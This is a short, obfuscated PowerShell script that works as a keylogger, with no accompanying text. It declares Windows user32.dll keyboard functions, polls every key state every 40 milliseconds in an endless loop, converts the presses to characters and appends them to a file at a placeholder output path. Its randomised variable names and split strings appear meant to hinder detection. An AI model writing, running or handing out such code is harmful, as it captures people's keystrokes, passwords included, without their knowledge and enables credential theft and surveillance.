$gmFbduETDl='OUTPUT_PATH';$rGMfbjfyTx=@'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$zdojid='W'+'i'+'n'+'3'+'2';$kCyeANxQBp = Add-Type -MemberDefinition $rGMfbjfyTx -Name $zdojid -Namespace API -PassThru;$HWzKFxGNsk = New-Item -Path $gmFbduETDl -ItemType File -Force;try{while ($true) {Start-Sleep -Milliseconds 40;for ($iwRQpRJTmi = 9; $iwRQpRJTmi -le 254; $iwRQpRJTmi++) {$ZvcRsQVvbl =$kCyeANxQBp::GetAsyncKeyState($iwRQpRJTmi);if($ZvcRsQVvbl -eq -32767){$HWzKFxGNsk = [console]::CapsLock;$QBGvdboWDG=$kCyeANxQBp::MapVirtualKey($iwRQpRJTmi, 3);$KUDzeespbi = New-Object Byte[] 256;$MLNdAbNWto = $kCyeANxQBp::GetKeyboardState($KUDzeespbi);$nOUeIWxSbM = New-Object -TypeName System.Text.StringBuilder;$ryniJObvay = $kCyeANxQBp::ToUnicode($iwRQpRJTmi, $QBGvdboWDG, $KUDzeespbi,$nOUeIWxSbM,$nOUeIWxSbM.Capacity,0);if($ryniJObvay){[System.IO.File]::AppendAllText($gmFbduETDl,$nOUeIWxSbM,[System.Text.Encoding]::Unicode)}}}}}
finally{}
